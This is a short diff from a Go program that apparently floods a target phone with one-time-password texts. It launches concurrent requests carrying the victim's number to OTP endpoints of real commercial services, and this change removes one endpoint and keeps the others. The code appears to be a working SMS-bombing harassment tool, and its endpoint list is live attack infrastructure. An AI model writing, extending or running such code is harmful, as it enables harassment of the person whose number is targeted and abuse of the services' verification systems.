@@ -508,9 +508,6 @@ func main() {
 		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
 			"mobile": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=a4547bd9&optionalVersion=5.6.6&UDID=2bb22fca-5212-47dd-9ff5-e6909df17d6b&lat=35.774&long=51.418", map[string]interface{}{
-			"cellphone": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://backend.digify.shop/user/merchant/otp/", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)  // edit :4/22/2025
